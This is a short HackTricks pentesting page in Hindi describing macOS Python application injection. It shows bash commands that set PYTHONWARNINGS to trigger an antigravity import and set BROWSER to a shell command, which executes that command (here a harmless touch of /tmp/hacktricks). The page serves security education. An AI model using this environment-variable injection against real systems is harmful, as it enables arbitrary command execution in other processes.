# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` और `BROWSER` environment variables के माध्यम से

यदि कोई attacker किसी Python process के environment को नियंत्रित कर सकता है, तो `PYTHONWARNINGS` और `BROWSER` का संयोजन command execution trigger कर सकता है, जब Python crafted warning option को process करते समय `antigravity` module import करता है। यह technique `antigravity` द्वारा Python के `webbrowser` module से URL खोलने पर निर्भर करती है, जो `BROWSER` environment variable को मान्यता देता है।<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## References

- [1] [Environment Variables के साथ Hacking - elttam](https://www.elttam.com/blog/env/)
{{#include ../../../banners/hacktricks-training.md}}
